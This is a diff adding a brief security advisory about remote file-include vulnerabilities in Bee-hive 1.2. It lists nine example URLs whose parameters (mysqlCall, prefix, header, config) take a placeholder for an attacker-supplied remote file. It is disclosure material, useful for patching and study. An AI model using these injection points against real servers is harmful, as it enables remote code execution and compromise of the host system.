@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/18654/info
+
+Bee-hive is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input to the application.
+
+An attacker may leverage these issues to have an arbitrary remote file containing malicious script code execute in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system. Other attacks are also possible.
+
+These issues affect version 1.2; other versions may also be vulnerable.
+
+http://www.example.com/include/listall.inc.php?mysqlcall=[file] 
+http://www.example.com/show/index.php?prefix=[file] 
+http://www.example.com/conad/include/rootGui.inc.php?header=[file] 
+http://www.example.com/conad/include/mysqlCall.inc.php?config=[file] 
+http://www.example.com/conad/changeEmail.inc.php?mysqlCall=[file] 
+http://www.example.com/conad/changeUserDetails.inc.php?mysqlCall=[file] 
+http://www.example.com/conad/checkPasswd.inc.php?mysqlCall=[file] 
+http://www.example.com/conad/login.inc.php?mysqlCall=[file] 
+http://www.example.com/conad/logout.inc.php?mysqlCall=[file]
